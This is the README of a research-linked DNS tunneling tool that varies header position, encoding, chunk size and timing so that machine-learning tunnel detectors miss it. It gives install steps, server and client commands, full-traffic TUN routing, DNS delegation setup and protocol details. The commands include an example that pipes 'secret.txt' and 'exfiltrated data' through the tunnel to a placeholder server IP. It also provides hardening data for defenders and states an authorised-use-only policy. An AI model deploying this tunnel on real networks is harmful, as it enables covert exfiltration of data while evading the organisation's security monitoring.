# mutant-dns

DNS tunnel with **4-dimensional structural mutations** that defeat ML-based detection.

Standard tools like [iodine](https://code.kryo.se/iodine/) and [dnscat2](https://github.com/iagox86/dnscat2) always place their protocol headers at byte offset 0–20 of the encoded payload. ML detectors learn this positional signature and achieve 98%+ recall. **mutant-dns** moves the header to a random position at 70–80% of the payload, randomizes the encoding per packet, varies chunk sizes, and randomizes inter-query timing — four simple changes that drop detection to 0% on tree-based models and below 30% on neural networks.

> Based on: *"Simple Payload Mutations Break Machine Learning Based DNS Tunneling Detection"*
> Reynier Leyva La O & Carlos A. Catania — 2025
> [Dataset & framework →](https://github.com/reypapin/Tunnel-DNS)

---

## Install

```bash
pip install mutant-dns
```

Requires Python 3.8+ and Linux (TUN mode). Data mode works on any OS.

---

## Quick start

### Data mode — tunnel files over DNS

**Server** (machine with public IP, port 53 open):
```bash
mutant-dns-server --domain tunnel.example.com
```

**Client** (any machine):
```bash
# Send a file
mutant-dns-client --domain tunnel.example.com --server SERVER_IP < secret.txt

# Send stdin
echo "exfiltrated data" | mutant-dns-client --domain tunnel.example.com --server SERVER_IP
```

Decoded data appears on the server's stdout.

---

### TUN mode — full IP tunnel (like iodine)

**Server** (root required):
```bash
sudo mutant-dns-server --domain tunnel.example.com --tun --tun-ip 10.0.0.1
```

**Client** (root required):
```bash
sudo mutant-dns-client --domain tunnel.example.com --server SERVER_IP \
     --tun --tun-ip 10.0.0.2 --tun-gw 10.0.0.1

# Route all traffic through the tunnel:
sudo mutant-dns-client --domain tunnel.example.com --server SERVER_IP \
     --tun --tun-ip 10.0.0.2 --tun-gw 10.0.0.1 --default-route
```

---

## DNS delegation setup

For real-world use (traffic through a recursive resolver):

```
; Zone file for example.com
tunnel.example.com.  IN  NS   ns1.example.com.
ns1.example.com.     IN  A    <your server's public IP>
```

For local testing or lab use, point the client directly to the server IP with `--server` — no delegation needed.

---

## Mutations

mutant-dns applies four independent structural mutations, combining them automatically:

| Dimension | Default | Options |
|-----------|---------|---------|
| **Position** | random 70–80% of payload | fixed by `--position-frac` |
| **Encoding** | weighted (hex 60%, base32 30%, base64 10%) | `--encoding hex\|base32\|base64\|weighted` |
| **Chunking** | variable 8–40 bytes | `--chunking variable\|fixed40\|fixed35\|fixed16` |
| **Timing** | random 0–400 ms | `--timing burst\|steady\|random\|human\|burst_pause` |

With defaults, each packet uses a different encoding and a different chunk size, and queries arrive at irregular intervals — matching how real attackers behave according to threat intelligence reports.

---

## Reference

### mutant-dns-server

```
usage: mutant-dns-server --domain DOMAIN [options]

required:
  --domain DOMAIN     Tunnel base domain (e.g. tunnel.example.com)

network:
  --host HOST         Bind address [default: 0.0.0.0]
  --port PORT         UDP listen port [default: 53]

data mode output:
  --output FILE       Output file for decoded data (- for stdout) [default: stdout]

TUN mode (requires root):
  --tun               Enable TUN mode — full IP tunnel
  --tun-ip IP         Server TUN IP [default: 10.0.0.1]
  --tun-name NAME     TUN interface name [default: tun0]
  --tun-mtu MTU       TUN MTU [default: 1200]

  -v, --verbose       Verbose logging to stderr
```

### mutant-dns-client

```
usage: mutant-dns-client --domain DOMAIN --server IP [options]

required:
  --domain DOMAIN     Tunnel base domain
  --server IP         mutant-dns-server IP address

connection:
  --port PORT         DNS server port [default: 53]
  --retries N         Retries per failed chunk [default: 3]

mutations:
  --encoding STR      weighted|hex|base32|base64 [default: weighted]
  --chunking STR      variable|fixed40|fixed35|fixed16 [default: variable]
  --timing STR        burst|steady|random|human|burst_pause [default: random]

data mode:
  --input FILE        Input file (- for stdin) [default: stdin]

TUN mode (requires root):
  --tun               Enable TUN mode
  --tun-ip IP         Client TUN IP [default: 10.0.0.2]
  --tun-gw IP         Server (gateway) TUN IP [default: 10.0.0.1]
  --tun-name NAME     TUN interface name [default: tun0]
  --tun-mtu MTU       TUN MTU [default: 1200]
  --default-route     Route all traffic through the tunnel
  --poll-interval SEC S2C poll interval [default: 0.2]

  -v, --verbose       Verbose output to stderr
```

---

## How it works

Standard tools (iodine, dnscat2) always encode their session header at the beginning of the DNS subdomain. ML detectors learn this fixed-position pattern and use it as the primary detection feature. mutant-dns inserts the same 9-byte header at a random position inside the encoded data:

```
Standard (iodine/dnscat2):   [HEADER][    payload    ]
mutant-dns:                  [  payload  ][HEADER][payload]
                                          ↑
                                     70–80% offset
```

The header (`0xC1AE` magic + tunnel_id + seq + codec + checksum) can be located at any position. The server finds it by scanning for magic bytes after decoding with each available codec.

---

## Protocol

```
Header: 9 bytes, big-endian
  magic(2)      0xC1AE
  tunnel_id(2)  session identifier
  seq(2)        packet sequence number
  codec(1)      0x01=hex  0x02=base32  0x03=base64
  checksum(2)   MD5(payload)[0:2]
```

The header is inserted at `int(len(payload) * U(0.70, 0.80))`.
The combined bytes are encoded with the selected codec and split into ≤63-character DNS labels.

---

## Detection results (from the paper)

| Model | CIC 2021 (standard tools) | mutant-dns | After hardening |
|-------|--------------------------|------------|-----------------|
| Random Forest | 98.88% | **0.00%** | 100% |
| XGBoost | 98.89% | **0.00%** | 100% |
| LightGBM | 98.90% | **0.00%** | 100% |
| CNN | 98.83% | 29.18% | 100% |
| LSTM | 98.86% | 1.68% | 100% |
| Logistic Reg. | 98.52% | 45.61% | 100% |

Hardening requires only 3.63% adversarial examples in the training set.
Use the [Mutant Payload dataset](https://github.com/reypapin/Dns-Tunnel-Robustness) to harden your detector.

---

## Ethical use

This tool is intended for:
- **Defenders**: test your DNS tunneling detector against structural mutations
- **Researchers**: reproduce results from the paper
- **Educators**: demonstrate positional overfitting in ML models

Use only on networks and systems you own or have explicit authorization to test.

---

## Cite

```bibtex
@article{leyva2025mutant,
  title   = {Simple Payload Mutations Break Machine Learning Based DNS Tunneling Detection},
  author  = {Leyva La O, Reynier and Catania, Carlos A.},
  year    = {2026}
}
```
